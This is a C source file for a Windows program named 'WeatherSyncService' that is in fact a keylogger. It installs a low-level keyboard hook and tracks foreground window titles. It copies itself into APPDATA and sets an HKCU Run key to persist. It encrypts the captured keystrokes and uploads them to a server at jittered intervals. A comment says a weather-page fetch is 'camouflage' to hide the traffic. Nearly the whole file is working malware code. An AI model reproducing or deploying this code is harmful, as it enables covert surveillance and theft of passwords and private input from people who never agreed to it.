// WeatherSyncService — entry point, persistence, and flush scheduling.
//
// Thread A (main): WH_KEYBOARD_LL hook + 1 s SetTimer tick + message pump.
// Thread B (worker): serialize -> seal -> POST; the only slow work happens
// here so the hook callback always returns in microseconds.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "buffer.h"
#include "capture.h"
#include "config.h"
#include "crypto.h"
#include "gen_strings.h" // CFG_PERSIST, CFG_DEBUG_CONSOLE (build-generated)
#include "net.h"
#include "util.h"

#if CFG_DEBUG_CONSOLE
#define DBG(...) fprintf(stderr, __VA_ARGS__)
#else
#define DBG(...) ((void)0)
#endif

#define TICK_MS        1000
#define TITLE_REFRESH  5000    // foreground-title refresh interval
#define WATCHDOG_MS    30000  // hook watchdog interval
#define FLUSH_MIN_MS   30000  // upload jitter window [30 s, 150 s]
#define FLUSH_MAX_MS   150000
#define BACKOFF_MIN_MS 60000  // failure backoff start
#define BACKOFF_MAX_MS 3600000

static HANDLE g_flush_event;
static volatile uint64_t g_backoff_until;
static uint64_t g_backoff_ms = BACKOFF_MIN_MS;

static uint32_t rand_range(uint32_t lo, uint32_t hi)
{
    return lo + (uint32_t)rand() % (hi - lo + 1);
}

// ---- persistence -----------------------------------------------------------

static void build_target_path(wchar_t *out, size_t cap)
{
    wchar_t appdir[64], exefile[64];
    cfg_get_str(CFG_APPDIR, appdir, 64);
    cfg_get_str(CFG_EXEFILE, exefile, 64);

    wchar_t appdata[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    _snwprintf(out, cap, L"%s\\%s\\%s", appdata, appdir, exefile);
}

// If not already running from the install location: copy self, set the HKCU
// Run key, start the installed copy, and exit this instance. `mutex` is our
// single-instance handle; it is released before launching the child so the
// child's mutex check cannot race with this process's exit.
static bool install_self(HANDLE mutex)
{
    wchar_t target[MAX_PATH], current[MAX_PATH];
    build_target_path(target, MAX_PATH);
    GetModuleFileNameW(NULL, current, MAX_PATH);

    if (_wcsicmp(current, target) == 0)
        return false; // already the installed instance

    wchar_t dir[MAX_PATH];
    wchar_t appdir[64];
    cfg_get_str(CFG_APPDIR, appdir, 64);
    wchar_t appdata[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    _snwprintf(dir, MAX_PATH, L"%s\\%s", appdata, appdir);
    CreateDirectoryW(dir, NULL);

    if (!CopyFileW(current, target, FALSE))
        return false;

    wchar_t runval[64];
    cfg_get_str(CFG_RUNVAL, runval, 64);
    HKEY key;
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
                       L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, NULL, 0, KEY_SET_VALUE, NULL, &key, NULL)
            == ERROR_SUCCESS) {
        RegSetValueExW(key, runval, 0, REG_SZ, (const BYTE *)target,
                       (DWORD)((wcslen(target) + 1) * sizeof(wchar_t)));
        RegCloseKey(key);
    }

    // Hand the single-instance lock to the child before spawning it, so the
    // child's CreateMutexW cannot race with this process's exit.
    if (mutex)
        ReleaseMutex(mutex);

    STARTUPINFOW si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(target, NULL, NULL, NULL, FALSE, 0, NULL, NULL,
                       &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true; // caller exits; the installed copy does the work
    }

    // Launch failed — keep this instance running instead. (Mutex still held.)
    return false;
}

// ---- worker thread ----------------------------------------------------------

static void do_flush(const char *devid)
{
    char *text = buf_serialize();
    if (!text)
        return;
    size_t text_len = strlen(text);
    if (text_len == 0) {
        HeapFree(GetProcessHeap(), 0, text);
        return;
    }

    uint8_t psk[32];
    cfg_get_psk(psk);

    uint8_t nonce[12], tag[16];
    uint8_t *ct = NULL;
    size_t ct_len = 0;

    bool sent = false;
    bool sealed = crypto_seal_batch(psk, devid, 16, (const uint8_t *)text,
                                    text_len, nonce, &ct, &ct_len, tag);
    if (sealed) {
        sent = net_post_sync(devid, now_ms(), nonce, ct, ct_len, tag);
        SecureZeroMemory(ct, ct_len);
        HeapFree(GetProcessHeap(), 0, ct);
    }
    DBG("flush: sealed=%d sent=%d text_len=%zu ct_len=%zu\n",
        (int)sealed, (int)sent, text_len, ct_len);
    SecureZeroMemory(psk, sizeof(psk));
    HeapFree(GetProcessHeap(), 0, text);

    if (sent) {
        buf_clear();
        g_backoff_ms = BACKOFF_MIN_MS;
        g_backoff_until = 0;
    } else {
        g_backoff_until = now_ms() + rand_range(g_backoff_ms / 2,
                                                g_backoff_ms + g_backoff_ms / 2);
        if (g_backoff_ms < BACKOFF_MAX_MS)
            g_backoff_ms *= 2;
    }
}

static DWORD WINAPI worker_thread(void *arg)
{
    (void)arg;

    char devid[17];
    crypto_device_id(devid);

    // First-run camouflage: fetch the weather page shortly after install so
    // the first minutes of traffic look like a user opening a weather app.
    Sleep((int)rand_range(5000, 13000));
    net_get_home();

    for (;;) {
        WaitForSingleObject(g_flush_event, INFINITE);
        do_flush(devid);
    }
    return 0;
}

// ---- main -------------------------------------------------------------------

int WINAPI wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int show)
{
    (void)inst; (void)prev; (void)cmdline; (void)show;

    srand(GetTickCount());

    // Single-instance guard.
    wchar_t mutex_name[128];
    cfg_get_str(CFG_MUTEX, mutex_name, 128);
    HANDLE mutex = CreateMutexW(NULL, TRUE, mutex_name);
    if (mutex && GetLastError() == ERROR_ALREADY_EXISTS)
        return 0;

#if CFG_PERSIST
    if (install_self(mutex)) {
        // The installed copy was launched. Release the single-instance mutex
        // first so the child's CreateMutexW cannot lose the race with our exit.
        return 0;
    }
#endif

    buf_init();

    if (!kbd_install())
        return 1;

    if (!net_init())
        return 1; // no network stack, nothing to do

    g_flush_event = CreateEventW(NULL, FALSE, FALSE, NULL);
    CreateThread(NULL, 0, worker_thread, NULL, 0, NULL);

    SetTimer(NULL, 1, TICK_MS, NULL);

    uint64_t next_title = 0, next_watchdog = 0, next_flush = 0, next_dbg = 0;
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        if (msg.message == WM_TIMER) {
            uint64_t now = now_ms();

#if CFG_DEBUG_CONSOLE
            if (now >= next_dbg) {
                DBG("tick: count=%zu hook=%d next_flush=%llds backoff=%llds\n",
                    buf_count(), kbd_hook_ok(),
                    (long long)(next_flush - now) / 1000,
                    (long long)(g_backoff_until - now) / 1000);
                next_dbg = now + 5000;
            }
#endif
            if (now >= next_title) {
                kbd_refresh_foreground_title();
                next_title = now + TITLE_REFRESH;
            }
            if (now >= next_watchdog) {
                if (!kbd_hook_ok())
                    kbd_install(); // OS dropped the hook; re-install it
                next_watchdog = now + WATCHDOG_MS;
            }
            if (next_flush == 0)
                next_flush = now + rand_range(FLUSH_MIN_MS, FLUSH_MAX_MS);
            if (now >= next_flush && now >= g_backoff_until &&
                buf_should_flush(now)) {
                SetEvent(g_flush_event);
                next_flush = now + rand_range(FLUSH_MIN_MS, FLUSH_MAX_MS);
            }
        } else {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    kbd_uninstall();
    net_shutdown();
    if (mutex)
        CloseHandle(mutex);
    return 0;
}
